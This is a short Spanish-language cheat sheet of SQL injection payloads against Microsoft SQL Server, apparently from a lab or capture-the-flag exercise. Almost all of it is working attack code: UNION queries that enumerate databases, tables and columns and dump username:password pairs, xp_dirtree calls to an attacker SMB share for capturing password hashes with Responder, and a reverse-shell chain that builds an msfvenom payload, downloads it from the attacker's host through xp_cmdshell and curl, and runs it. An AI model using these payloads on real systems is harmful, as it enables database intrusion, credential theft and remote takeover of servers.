
### LISTAR VERSIÓN DEL SISTEMA.
```sql
test' union select 1,@@version,3,4,5,6-- -
```


### LISTAR TODAS LAS BASES DE DATOS.
```sql
test' union select 1,name,3,4,5,6 FROM master..sysdatabases-- -
```


### NOMBRE DE LA BASE DE DATOS (EN USO).
```sql
test' union select 1,(SELECT DB_NAME()),3,4,5,6-- -
```


### LISTAR TODAS LAS TABLAS.
```sql
test' union select 1,name,3,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- - #INDEPENDIENTEMENTE DE EN CUANTAS SE PUEDA ESCRIBIR LO ULTIMO SE TIENE QUE PONER.
```


### ROBAR HASH.
```sql
test'; use master; exec xp_dirtree '\\10.10.16.7\smbFolder\pwned';
```


### LISTAR IDENTIFIACOR DE LAS TABLAS..
```sql
test' union select 1,name,id,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- - #ESTE IDENTIFICADOR ES CRUCIAL A LA HORA DE PODER LISTAR LAS COLUMNAS.
```


### LISTAR TODAS LAS COLUMNAS.
```sql
test' union select 1,name,3,4,5,6 FROM syscolumns WHERE id = 901578250-- - #IGUALAMOS EL ID AL QUE QUERAMOS ENUMERAR.
```


### LISTAR CONTENIDO DE COLUMNAS.
```sql
test' union select 1,concat(username,':',password),3,4,5,6 FROM users-- -
```

### ROBAR HASH
```SQL
sudo responder -I tun0 -wd
';exec master..xp_dirtree '\\192.168.45.192\test';-- - s
```


### REVERSE SHELL
```python
sudo python3 -m http.server 80
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.192 LPORT=443 -f exe -o shell.exe
';exec master..xp_cmdshell 'curl 192.168.45.192/shell.exe -o C:\windows\temp\sfp.exe';-- - s
';exec master..xp_cmdshell 'cmd /c C:\windows\temp\sfp.exe';-- -s
```